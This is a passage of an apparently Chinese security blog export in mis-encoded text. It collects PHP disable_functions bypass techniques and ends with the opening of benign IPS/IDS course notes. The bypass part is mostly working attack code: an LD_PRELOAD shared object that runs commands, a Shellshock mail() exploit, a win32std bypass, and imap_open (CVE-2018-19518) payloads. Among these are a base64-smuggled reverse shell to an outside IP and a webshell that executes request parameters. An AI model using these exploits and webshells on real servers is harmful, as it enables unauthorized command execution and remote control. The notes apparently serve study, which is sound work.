<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    // get command line options and arg</span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line"></span><br><span class="line">    // unset environment variable LD_PRELOAD.</span><br><span class="line">    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br><span class="line">    // distribution (e.g., centos), I need crafty trick.</span><br><span class="line">    int i;</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &apos;\0&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // executive command</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å°† bypass_disablefunc.c ç¼–è¯‘ä¸ºå…±äº«å¯¹è±¡ bypass_disablefunc_x64.soï¼š<code>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so</code>ï¼Œè‹¥è¦ç¼–è¯‘æˆX86æ¶æ„éœ€è¦åŠ ä¸Š-m32é€‰é¡¹</p>
</li>
<li><p>ä¸Šä¼  bypass_disablefunc_x64.soå’Œbypass_disablefunc.phpè„šæœ¬ï¼ŒæŒ‰bypass_disablefunc.phpä¸­æç¤ºè¿›è¡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
</li>
</ul>
<p><img src="/images/php-about/disable_function/bypass_disablefunc_shell.png" alt="bypass_disablefunc_shell"></p>
<ul>
<li>æ¥è‡ªyangyangwithgnuå¤§ä½¬çš„è„šæœ¬<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener"> bypass_disablefunc_via_LD_PRELOAD</a><ul>
<li>bypass_disablefunc.php</li>
<li>bypass_disablefunc.c</li>
<li>bypass_disablefunc_x64.so</li>
</ul>
</li>
<li>â–² æœ¬å®éªŒæ˜¯é€šè¿‡mail()å‡½æ•°å»åŠ è½½soæ–‡ä»¶çš„ï¼Œä½†å¹¶ä¸åªå‰©å•å•mail()å‡½æ•°ä¸€ä¸ªï¼Œæ­¤é“¾æ¥<a href="https://www.anquanke.com/post/id/197745#h3-11" target="_blank" rel="noopener">PHP çªç ´ disable_functions å¸¸ç”¨å§¿åŠ¿ä»¥åŠä½¿ç”¨ Fuzz æŒ–æ˜å«å†…éƒ¨ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°</a> &amp;&amp; <a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/" target="_blank" rel="noopener">Fuzzer gets us new functions to bypass PHP disable_functions</a> ä»‹ç»åˆ°äº†æ›´å¤šfuzzå†…éƒ¨ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°çš„åŸç†ä»¥åŠè„šæœ¬</li>
</ul>
<h3 id="0X03-PHP-5-x-Shellshock-Exploit-bypass-disable-functions"><a href="#0X03-PHP-5-x-Shellshock-Exploit-bypass-disable-functions" class="headerlink" title="0X03 PHP 5.x Shellshock Exploit (bypass disable_functions)"></a>0X03 PHP 5.x Shellshock Exploit (bypass disable_functions)</h3><h5 id="å½±å“ç‰ˆæœ¬ï¼šPHP-lt-5-6-2-â€“-â€˜Shellshockâ€™-Safe-Mode-Disable-Functions-Bypass-Command-Injection"><a href="#å½±å“ç‰ˆæœ¬ï¼šPHP-lt-5-6-2-â€“-â€˜Shellshockâ€™-Safe-Mode-Disable-Functions-Bypass-Command-Injection" class="headerlink" title="å½±å“ç‰ˆæœ¬ï¼šPHP &lt; 5.6.2 â€“ â€˜Shellshockâ€™ Safe Mode / Disable Functions Bypass / Command Injection"></a>å½±å“ç‰ˆæœ¬ï¼šPHP &lt; 5.6.2 â€“ â€˜Shellshockâ€™ Safe Mode / Disable Functions Bypass / Command Injection</h5><h5 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h5><ul>
<li>Linux Web Serverä¸€èˆ¬å¯ä»¥æä¾›CGIæ¥å£ï¼Œå…è®¸è¿œç¨‹æ‰§è¡ŒBashå‘½ä»¤</li>
<li>å¯¹äºHTTPå¤´éƒ¨ï¼ŒCGIè„šæœ¬è§£æå™¨ä¼šå°†å…¶å½“ä½œç¯å¢ƒå˜é‡ï¼Œè°ƒç”¨bashçš„envç›¸å…³å‡½æ•°è®¾ç½®åˆ°ä¸´æ—¶ç¯å¢ƒå˜é‡ä¸­</li>
<li>HTTPåè®®å…è®¸å‘é€ä»»æ„å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„HTTPå¤´éƒ¨</li>
<li>â–² è¿™æ ·å°±äº§ç”Ÿäº†ä¸€ä¸ªå®Œæ•´çš„å¯ä¾›Bashå‘½ä»¤æ³¨å…¥çš„åœºæ™¯ï¼Œå®¢æˆ·ç«¯æ•…æ„å‘é€æ„é€ å¥½çš„å¸¦æ”»å‡»å‘½ä»¤çš„HTTPå¤´éƒ¨åˆ°æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯è°ƒç”¨è®¾ç½®ç¯å¢ƒå˜é‡çš„å‡½æ•°ï¼Œç›´æ¥æ‰§è¡Œäº†å®¢æˆ·ç«¯æŒ‡å®šçš„å¤´éƒ¨é‡Œé¢çš„å‘½ä»¤ã€‚å¹¶ä¸”è¿˜ä¼šå°†ç»“æœä¸€å¹¶è¿”å›ç»™å®¢æˆ·ç«¯</li>
</ul>
<h5 id="exploit-dbä¸Šçš„è„šæœ¬-â€”-ç ´å£³æ¼æ´"><a href="#exploit-dbä¸Šçš„è„šæœ¬-â€”-ç ´å£³æ¼æ´" class="headerlink" title="exploit-dbä¸Šçš„è„šæœ¬  â€”  ç ´å£³æ¼æ´"></a><a href="https://www.exploit-db.com/exploits/35146" target="_blank" rel="noopener">exploit-dbä¸Šçš„è„šæœ¬</a>  â€”  ç ´å£³æ¼æ´</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)</span></span><br><span class="line"><span class="comment"># Google Dork: none</span></span><br><span class="line"><span class="comment"># Date: 10/31/2014</span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net</span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror</span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2)</span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6</span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271</span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"Disabled functions: "</span>.ini_get(<span class="string">'disable_functions'</span>).<span class="string">"n"</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span><span class="params">($cmd)</span> </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @ mail.c:283</span></span><br><span class="line">   <span class="keyword">if</span>(strstr(readlink(<span class="string">"/bin/sh"</span>), <span class="string">"bash"</span>) != <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">     $tmp = tempnam(<span class="string">"."</span>,<span class="string">"data"</span>);</span><br><span class="line">     putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1"</span>);</span><br><span class="line">     <span class="comment">// In Safe Mode, the user may only alter environment variables whose names</span></span><br><span class="line">     <span class="comment">// begin with the prefixes supplied by this directive.</span></span><br><span class="line">     <span class="comment">// By default, users will only be able to set environment variables that</span></span><br><span class="line">     <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive is empty,</span></span><br><span class="line">     <span class="comment">// PHP will let the user modify ANY environment variable!</span></span><br><span class="line">     mail(<span class="string">"a@127.0.0.1"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">"-bv"</span>); <span class="comment">// -bv so we don't actually send any mail</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"Not vuln (not bash)"</span>;</span><br><span class="line">   $output = @file_get_contents($tmp);</span><br><span class="line">   @unlink($tmp);</span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">""</span>) <span class="keyword">return</span> $output;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"No output, or not vuln."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>â–² 2020.08.25 æœ¬å®éªŒå› ç¯å¢ƒç¼ºä¹ï¼Œæš‚æ— è¿›è¡Œå®éªŒ</li>
</ul>
<h3 id="0X04-PHP-5-2-3-win32std-extension-safe-mode-and-bypass-disable-functions"><a href="#0X04-PHP-5-2-3-win32std-extension-safe-mode-and-bypass-disable-functions" class="headerlink" title="0X04 PHP 5.2.3 win32std extension safe_mode and bypass disable_functions"></a>0X04 PHP 5.2.3 win32std extension safe_mode and bypass disable_functions</h3><ul>
<li>â–² è„šæœ¬åè€ï¼Œé€‚ç”¨äºXPç³»åˆ—çš„ç³»ç»Ÿ</li>
</ul>
<p><a href="https://www.exploit-db.com/exploits/4218" target="_blank" rel="noopener">exploit-dbä¸Šçš„è„šæœ¬</a> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 5.2.3 win32std extension safe_mode and disable_functions protections bypass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//author: shinnai</span></span><br><span class="line"><span class="comment">//mail: shinnai[at]autistici[dot]org</span></span><br><span class="line"><span class="comment">//site: http://shinnai.altervista.org</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tested on xp Pro sp2 full patched, worked both from the cli and on apache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Thanks to rgod for all his precious advises :)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//I set php.ini in this way:</span></span><br><span class="line"><span class="comment">//safe_mode = On</span></span><br><span class="line"><span class="comment">//disable_functions = system</span></span><br><span class="line"><span class="comment">//if you launch the exploit from the cli, cmd.exe will be wxecuted</span></span><br><span class="line"><span class="comment">//if you browse it through apache, you'll see a new cmd.exe process activated in taskmanager</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!extension_loaded(<span class="string">"win32std"</span>)) <span class="keyword">die</span>(<span class="string">"win32std extension required!"</span>);</span><br><span class="line">system(<span class="string">"cmd.exe"</span>); <span class="comment">//just to be sure that protections work well</span></span><br><span class="line">win_shell_execute(<span class="string">"..\..\..\..\windows\system32\cmd.exe"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>â–² 2020.08.25 æœ¬å®éªŒå› ç¯å¢ƒç¼ºä¹ï¼Œæš‚æ— è¿›è¡Œå®éªŒ</p>
<h3 id="0X05-PHP-FPM-FastCGI-bypass-disable-function"><a href="#0X05-PHP-FPM-FastCGI-bypass-disable-function" class="headerlink" title="0X05 PHP-FPM/FastCGI bypass disable_function"></a>0X05 PHP-FPM/FastCGI bypass disable_function</h3><ul>
<li>â–² åŸºäºPHP-FPMçš„æœªæˆæƒèŒƒå›´æ¼æ´ï¼Œå¯è‡ªå®šä¹‰ä»»æ„ä»£ç æ‰§è¡Œã€</li>
<li>å‰æ<ul>
<li>tcpç›‘å¬æ–¹å¼ï¼Œç›‘å¬æ–¹å¼ä¸º0.0.0.0:9000</li>
<li>phpç»“åˆçš„æ–¹å¼ä¸ºfpm/FastCGI</li>
</ul>
</li>
<li>æ„é€ Pç‰›çš„è„šæœ¬ <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">fpm.pyå…¼å®¹py3å’Œpy2</a></li>
</ul>
<p><img src="/images/php-about/disable_function/php-fpm-bypass.png" alt="php-fpm-bypass"></p>
<h3 id="0X06-PHP-imap-open-RCEæ¼æ´ï¼ˆCVE-2018-19518ï¼‰"><a href="#0X06-PHP-imap-open-RCEæ¼æ´ï¼ˆCVE-2018-19518ï¼‰" class="headerlink" title="0X06 PHP imap_open RCEæ¼æ´ï¼ˆCVE-2018-19518ï¼‰"></a>0X06 PHP imap_open RCEæ¼æ´ï¼ˆCVE-2018-19518ï¼‰</h3><h5 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h5><ul>
<li><p>â–² éé»˜è®¤å®‰è£…çš„ç»„ä»¶</p>
</li>
<li><p>åœ¨æ²¡æœ‰ç¦ç”¨enable_insecure_rshé€‰é¡¹çš„æ¡ä»¶ä¸‹ï¼Œç”¨æˆ·é€šè¿‡ä¼ å…¥mailboxå‚æ•°å¯å¯¼è‡´rce</p>
</li>
<li><p>è¯¥æ¼æ´çš„å­˜åœ¨æ˜¯å› ä¸ºå—å½±å“çš„è½¯ä»¶çš„imap_openå‡½æ•°åœ¨å°†é‚®ç®±åç§°ä¼ é€’ç»™rshæˆ–sshå‘½ä»¤ä¹‹å‰ä¸æ­£ç¡®åœ°è¿‡æ»¤é‚®ç®±åç§°ã€‚å¦‚æœå¯ç”¨äº†rshå’ŒsshåŠŸèƒ½å¹¶ä¸”rshå‘½ä»¤æ˜¯sshå‘½ä»¤çš„ç¬¦å·é“¾æ¥ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘ç›®æ ‡ç³»ç»Ÿå‘é€åŒ…å«-oProxyCommandå‚æ•°çš„æ¶æ„IMAPæœåŠ¡å™¨åç§°æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚æˆåŠŸçš„æ”»å‡»å¯èƒ½å…è®¸æ”»å‡»è€…ç»•è¿‡å…¶ä»–ç¦ç”¨çš„exec å—å½±å“è½¯ä»¶ä¸­çš„åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¿™äº›åŠŸèƒ½åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„shellå‘½ä»¤</p>
</li>
<li><p>åå¼¹shell payload</p>
<ul>
<li>â–² 2020.08.29 è„šæœ¬ä¿®æ”¹åä¹Ÿæ— æ³•è¿›è¡Œåå¼¹</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.67.153/7777 0&gt;&amp;1"</span>;</span><br><span class="line">$base64 = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"x -oProxyCommand=echo\t"</span>.$base64.<span class="string">"|base64\t-d|sh&#125;"</span>;</span><br><span class="line">@imap_open(<span class="string">"&#123;"</span>.$server.<span class="string">"&#125;:143/imap&#125;INBOX"</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ä»£ç æ‰§è¡Œpayload</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'imap_open'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no imap_open function!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$server = <span class="string">"x -oProxyCommand=echo\t"</span> . base64_encode($_GET[<span class="string">'cmd'</span>] . <span class="string">"&gt;/tmp/cmd_result"</span>) . <span class="string">"|base64\t-d|sh&#125;"</span>;</span><br><span class="line"><span class="comment">//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . "&gt;/tmp/cmd_result") . '|base64$IFS$()-d|sh&#125;';</span></span><br><span class="line">imap_open(<span class="string">'&#123;'</span> . $server . <span class="string">':143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>); <span class="comment">// or var_dump("\n\nError: ".imap_last_error());</span></span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/tmp/cmd_result"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/disable_function/imap-code-execution.png" alt="imap-code-execution"></p>
<h3 id="0X07-åˆ©ç”¨PHP-bug-Bypass-disable-function"><a href="#0X07-åˆ©ç”¨PHP-bug-Bypass-disable-function" class="headerlink" title="0X07 åˆ©ç”¨PHP bug Bypass disable_function"></a>0X07 åˆ©ç”¨PHP bug Bypass disable_function</h3><ul>
<li>Exploitï¼š<a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">mmor1å¸ˆå‚…çš„exploits</a></li>
<li>åˆ©ç”¨ä¸‰ä¸ª PHP å†å²æ¼æ´æ¥ç»•è¿‡ disable_functions</li>
</ul>
<h5 id="Use-after-free-with-json-serializer"><a href="#Use-after-free-with-json-serializer" class="headerlink" title="Use after free with json serializer"></a>Use after free with json serializer</h5><ul>
<li>å‚è€ƒé“¾æ¥ï¼š<a href="https://bugs.php.net/bug.php?id=77843" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=77843</a></li>
<li>é€‚ç”¨ç›®æ ‡ï¼ˆ*nixç³»ç»Ÿï¼‰<ul>
<li>7.1 â€“ all versions to date</li>
<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
</ul>
</li>
<li>â–² 2020.08.29 å› å®éªŒç¯å¢ƒè¿‡é«˜ï¼Œæš‚æ— è¿›è¡Œå®éªŒ</li>
</ul>
<h5 id="Use-after-free-in-GC-with-Certain-Destructors"><a href="#Use-after-free-in-GC-with-Certain-Destructors" class="headerlink" title="Use after free in GC with Certain Destructors"></a>Use after free in GC with Certain Destructors</h5><ul>
<li>å‚è€ƒé“¾æ¥ï¼š<a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72530</a></li>
<li>é€‚ç”¨ç›®æ ‡ï¼ˆ*nixç³»ç»Ÿï¼‰<ul>
<li>7.0 â€“ all versions to date</li>
<li>7.1 â€“ all versions to date</li>
<li>7.2 â€“ all versions to date</li>
<li>7.3 â€“ all versions to date</li>
</ul>
</li>
</ul>
<p><img src="/images/php-about/disable_function/php-gc-bypass.png" alt="php-gc-bypass"></p>
<h5 id="Use-after-free-when-accessing-already-destructed-backtrace-arguments"><a href="#Use-after-free-when-accessing-already-destructed-backtrace-arguments" class="headerlink" title="Use-after-free when accessing already destructed backtrace arguments"></a><strong>Use-after-free when accessing already destructed backtrace arguments</strong></h5><ul>
<li>å‚è€ƒé“¾æ¥ï¼š<a href="https://bugs.php.net/bug.php?id=76047" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=76047</a></li>
<li>é€‚ç”¨ç›®æ ‡ï¼ˆ*nixç³»ç»Ÿï¼‰<ul>
<li>7.0 â€“ all versions to date</li>
<li>7.1 â€“ all versions to date</li>
<li>7.2 â€“ all versions to date</li>
<li>7.3 â€“ all versions to date</li>
</ul>
</li>
</ul>
<p><img src="/images/php-about/disable_function/php-backtrace-bypass.png" alt="php-backtrace-bypass"></p>
<h3 id="0X08-å…¶ä»–åˆ©ç”¨æ–¹æ³•"><a href="#0X08-å…¶ä»–åˆ©ç”¨æ–¹æ³•" class="headerlink" title="0X08 å…¶ä»–åˆ©ç”¨æ–¹æ³•"></a>0X08 å…¶ä»–åˆ©ç”¨æ–¹æ³•</h3><ul>
<li>FFIç»•è¿‡disable_function</li>
<li>Apache mod_cgi ä¿®æ”¹.htaccessç»•è¿‡é™åˆ¶</li>
<li>dl()å‡½æ•°ç»•è¿‡disable_functioné™åˆ¶</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="https://xz.aliyun.com/t/5320#toc-2" target="_blank" rel="noopener">PHP Webshellä¸‹ç»•è¿‡disable_functionçš„æ–¹æ³•</a></li>
<li><a href="https://blog.csdn.net/qq_41107295/article/details/98462891" target="_blank" rel="noopener">PHPç»•è¿‡disable_functioné™åˆ¶</a></li>
<li><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">æ— éœ€sendmailï¼šå·§ç”¨LD_PRELOADçªç ´disable_functions</a></li>
<li><a href="https://www.anquanke.com/post/id/197745#h3-11" target="_blank" rel="noopener">PHP çªç ´ disable_functions å¸¸ç”¨å§¿åŠ¿ä»¥åŠä½¿ç”¨ Fuzz æŒ–æ˜å«å†…éƒ¨ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°</a></li>
<li><a href="https://blog.csdn.net/fish43237/article/details/39609031" target="_blank" rel="noopener">ShellShockï¼ˆç ´å£³æ¼æ´ï¼‰çš„ç®€å•åˆ†æ</a></li>
<li><a href="https://evi1.cn/post/bypass_disable_func/" target="_blank" rel="noopener">Bypass disable_functions å­¦ä¹ ç¬”è®°</a></li>
<li><a href="http://www.91ri.org/8700.html" target="_blank" rel="noopener">Webshellä¸‹å‘½ä»¤æ‰§è¡Œé™åˆ¶åŠç»•è¿‡æ–¹æ³•</a></li>
</ul>
]]></content>
      <categories>
        <category>php-about</category>
      </categories>
  </entry>
  <entry>
    <title>IPSåŸºç¡€</title>
    <url>/2020/07/12/ips_base/</url>
    <content><![CDATA[<hr>
<h2 id="IPSåŸºç¡€"><a href="#IPSåŸºç¡€" class="headerlink" title="IPSåŸºç¡€"></a>IPSåŸºç¡€</h2><ul>
<li>IPSåŸºç¡€<ul>
<li>ä¸€ä¸ªçœŸå®çš„è •è™«æ”»å‡»</li>
<li>IDSäº§å“</li>
<li>IPSäº§å“</li>
<li>IPS/IDSæŠ€æœ¯å‘å±•å†ç¨‹</li>
<li>IPSã€IDSã€é˜²ç«å¢™</li>
<li>æŠ€æœ¯ä»‹ç»</li>
<li>èº²é¿æ‰‹æ®µ</li>
<li>Cisco 4240</li>
<li>å®éªŒ</li>
</ul>
</li>
<li>IPSç¯å¢ƒæ­å»º<ul>
<li>é€‰æ‹©GNS</li>
<li>åˆå§‹åŒ–IPS</li>
<li>IME</li>
</ul>
</li>
<li>IMEâ€“IPSä½¿ç”¨<ul>
<li>å¸¸ç”¨çš„ç½‘ç»œå®‰å…¨è®¾å¤‡</li>
<li>IPS -&gt; Sensor Setup</li>
<li>IPSå‡ºå…¥æµé‡ç­–ç•¥</li>
<li>IPS -&gt; Interface</li>
<li>IPS -&gt; Policies</li>
</ul>
</li>
<li>IMEâ€“IDSå®éªŒ<ul>
<li>IDSæ¨¡æ‹Ÿå®éªŒ</li>
<li>IDSï¼šIPS-4240</li>
<li>R1å’ŒR2</li>
<li>SWï¼šEtherSwitch router</li>
<li>æµ‹è¯•è¿é€šæ€§</li>
<li>SPANé…ç½®</li>
<li>å…¥ä¾µæ£€æµ‹</li>
</ul>
</li>
<li>IMEâ€“IPSå®éªŒ<ul>
<li>IPSæ¨¡æ‹Ÿå®éªŒ</li>
<li>IPSï¼šIPS-4240</li>
<li>R1å’ŒR2</li>
<li>SWï¼šEtherSwitch router</li>
<li>æµ‹è¯•è¿é€šæ€§</li>
<li>æ‹“æ‰‘é…ç½®</li>
<li>å…¥ä¾µæ£€æµ‹</li>
</ul>
</li>
</ul>
<h3 id="0X00-IPSåŸºç¡€"><a href="#0X00-IPSåŸºç¡€" class="headerlink" title="0X00 IPSåŸºç¡€"></a>0X00 IPSåŸºç¡€</h3><h5 id="ä¸€ä¸ªçœŸå®çš„è •è™«æ”»å‡»"><a href="#ä¸€ä¸ªçœŸå®çš„è •è™«æ”»å‡»" class="headerlink" title="ä¸€ä¸ªçœŸå®çš„è •è™«æ”»å‡»"></a>ä¸€ä¸ªçœŸå®çš„è •è™«æ”»å‡»</h5><ul>
<li>æ‰«æï¼Œå‘ç°ä¸»æœº</li>
<li>å‘ç›®æ ‡ä¸»æœºå‘é€æº¢å‡ºæŠ¥æ–‡ï¼Œæ§åˆ¶ç›®æ ‡æœº</li>
<li>è·å–ç›®æ ‡æœºæ§åˆ¶æƒ</li>
<li>ç›®æ ‡æœºå‘æ”»å‡»<ul>
<li>å‘æ–°å—å®³è€…å‘èµ·æ”»å‡»ï¼Œæœ€ç»ˆå½¢æˆè§„æ¨¡æ”»å‡»</li>
<li>å°†çœŸæ­£æ”»å‡»è€…éšè—ï¼Œå¢åŠ è¿½æŸ¥éš¾åº¦</li>
</ul>
</li>
<li>â–² è •è™«ç—…æ¯’å…·æœ‰è‡ªä¼ æ’­æ€§ï¼Œå¯ä»¥æ„ŸæŸ“æ•´ä¸ªå†…ç½‘ï¼Œä¸åŒäºå…¶ä»–çš„ç—…æ¯’</li>
</ul>
<p><img src="/images/ips/ips-notepad/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB.png" alt="è •è™«ç—…æ¯’æ”»å‡»"></p>
<p><img src="/images/ips/ips-notepad/%E5%95%86%E4%B8%9A%E5%8C%96%E9%98%B2%E6%94%BB%E5%87%BB%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.png" alt="å•†ä¸šåŒ–é˜²æ”»å‡»è§£å†³æ–¹æ¡ˆ"></p>
<h5 id="IDSäº§å“"><a href="#IDSäº§å“" class="headerlink" title="IDSäº§å“"></a>IDSäº§å“</h5><ul>
<li>IDSå®šä¹‰ï¼šIntrusion Detection Systemï¼Œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ<ul>
<li>An intrusion detection system has the capability to <strong>detect</strong> misuse and abuse of,and unauthorized access to,netwoeked resources.</li>
</ul>
</li>
<li>IDSçš„ä¸¤ä¸ªå…³é”®ç‰¹å¾<ul>
<li>å®ç°åº”ç”¨å±‚å¨èƒè¯†åˆ«ï¼Œæä¾›å¯¹ç½‘ç»œæ•°æ®çš„â€œç›‘è§†åŠŸèƒ½â€</li>
<li>æ—è·¯éƒ¨ç½²ï¼Œä¸é˜²ç«å¢™é…åˆå®ç°å®‰å…¨é˜²èŒƒ</li>
</ul>
</li>
<li>IDSä¼˜åŠ¿<ul>
<li>IDSä¸å½±å“ç½‘ç»œ</li>
<li>IDSçš„æŸåä¸ä¼šå½±å“åˆ°ç½‘ç»œçš„åŠŸèƒ½</li>
<li>ä¸€æ—¦è¶…è¿‡äº†IDSçš„å¤„ç†èƒ½åŠ›ä¸ä¼šå½±å“åˆ°ç½‘ç»œæµé‡ï¼Œè™½ç„¶è¿™äº›æ•°æ®ä¸èƒ½å¤Ÿè¢«IDSåˆ†æ</li>
</ul>
</li>
<li>IDSé—®é¢˜<ul>
<li>IDS response actionä¸èƒ½å¤Ÿé˜»æ­¢åˆå§‹åŒ–åŒ…ï¼Œä¹Ÿä¸èƒ½å¤Ÿä¿è¯é˜»æ­¢ä¸€ä¸ªè¿æ¥ï¼ŒIDSçš„å“åº”æŠ€æœ¯èƒ½å¤Ÿæ¯”è¾ƒå¥½çš„é˜»æ­¢ä¸€ä¸ªæ”»å‡»è€…è€Œä¸æ˜¯ä¸€ä¸ªæ”»å‡»ï¼ˆResetï¼ŒBlockï¼‰</li>
<li>IDSæ›´å®¹æ˜“å—åˆ°ç½‘ç»œé€ƒé¿æŠ€æœ¯çš„æ”»å‡»</li>
</ul>
</li>
<li><strong>æ³¨æ„</strong><ul>
<li>â–² IDSä¸€èˆ¬ç”¨äºå…¨æµé‡é•œåƒåˆ†æ</li>
</ul>
</li>
</ul>
<h5 id="IPSäº§å“"><a href="#IPSäº§å“" class="headerlink" title="IPSäº§å“"></a>IPSäº§å“</h5><ul>
<li>IPSå®šä¹‰ï¼šIntrusion Prevention Systemï¼Œå…¥ä¾µé˜²å¾¡ç³»ç»Ÿ<ul>
<li>An intrusion detection system has the capability to <strong>detect and prevent</strong> misuse and abuse of,and unauthorized access to,netwoeked resources.</li>
</ul>
</li>
<li>IPSçš„ä¸¤ä¸ªå…³é”®ç‰¹å¾<ul>
<li>æ·±å…¥ä¸ƒå±‚çš„æ•°æ®æµæ”»å‡»ç‰¹å¾æ£€æµ‹<ul>
<li>è •è™«ã€åŸºäºWebçš„æ”»å‡»ã€åˆ©ç”¨æ¼æ´çš„æ”»å‡»ã€ç½‘é¡µç¯¡æ”¹ã€æœ¨é©¬ã€ç—…æ¯’ã€P2Pæ»¥ç”¨ã€DoS/DDoSç­‰</li>
</ul>
</li>
<li>åœ¨çº¿éƒ¨ç½²ï¼Œå®æ—¶é˜»æ–­æ”»å‡»</li>
</ul>
</li>
<li>IPSä¼˜åŠ¿<ul>
